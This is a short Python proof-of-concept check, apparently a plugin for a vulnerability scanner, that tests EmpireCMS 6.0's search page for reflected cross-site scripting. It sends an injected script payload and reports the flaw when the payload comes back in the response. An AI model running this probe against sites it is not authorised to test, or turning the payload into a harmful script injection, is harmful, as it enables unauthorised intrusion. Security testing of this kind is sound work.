# coding: utf-8
import requests
import random

#EmpireCMS 6.0 搜索框xss
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    #漏洞位置
    exploit_url=url+'/search/keyword/index.php?allsame=3"><script>alert(/zerosec/)</script>'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exploit_url, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code==200:
        if 'zerosec' in response.text:
            return 'EmpireCMS V6.0 - 搜索框xss'


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

#run("http://127.0.0.1/EmpireCMS6.0/",{'admin':'admin'},'','')